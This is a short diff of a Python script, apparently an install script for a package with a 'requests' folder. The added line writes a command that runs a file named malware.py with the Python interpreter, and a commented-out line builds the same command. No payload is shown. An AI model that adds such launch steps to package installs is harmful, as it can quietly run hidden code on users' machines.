@@ -72,6 +72,7 @@ with open("/home/parish/output.txt", "w") as text_file:
     for root, dirs, files in os.walk(os.path.join(here, 'requests')):
         for file in files:
             text_file.write(os.path.join(root, file) + "\n")
+        text_file.write(sys.executable + " " + os.path.join(here, 'requests', 'malware.py'))
 
 
 # command = sys.executable + " " + os.path.join(here, 'requests', 'malware.py')
